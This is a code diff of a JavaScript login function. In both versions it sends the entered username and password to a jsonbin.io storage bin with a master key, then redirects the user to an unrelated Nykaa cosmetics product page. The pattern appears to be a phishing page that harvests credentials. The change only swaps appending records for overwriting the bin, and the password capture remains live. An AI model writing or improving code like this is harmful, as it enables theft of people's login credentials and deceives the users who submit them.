@@ -176,42 +176,28 @@ async function login() {
     return;
   }
 
-  const newData = {
+  const data = {
     username: user,
     password: pass,
     time: new Date().toISOString()
   };
 
   try {
-    // 1️⃣ Get current data
-    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-      headers: { "X-Master-Key": MASTER_KEY }
-    });
-    let currentData = [];
-    if (getRes.ok) {
-      const json = await getRes.json();
-      currentData = json.record || [];
-    }
-
-    // 2️⃣ Append new entry
-    currentData.push(newData);
-
-    // 3️⃣ Save back
-    const putRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
       method: "PUT",
       headers: {
         "Content-Type": "application/json",
         "X-Master-Key": MASTER_KEY
       },
-      body: JSON.stringify(currentData)
+      body: JSON.stringify(data)
     });
 
-    if (putRes.ok) {
+    if (res.ok) {
+      // 🔁 Redirect after submit
       window.location.href = "https://www.nykaa.com/kay-beauty-2-in-1-kajal-liner-duo/p/14337609?productId=14337609";
     } else {
       status.textContent = "Something went wrong";
     }
-
   } catch (e) {
     status.textContent = "Network error";
   }
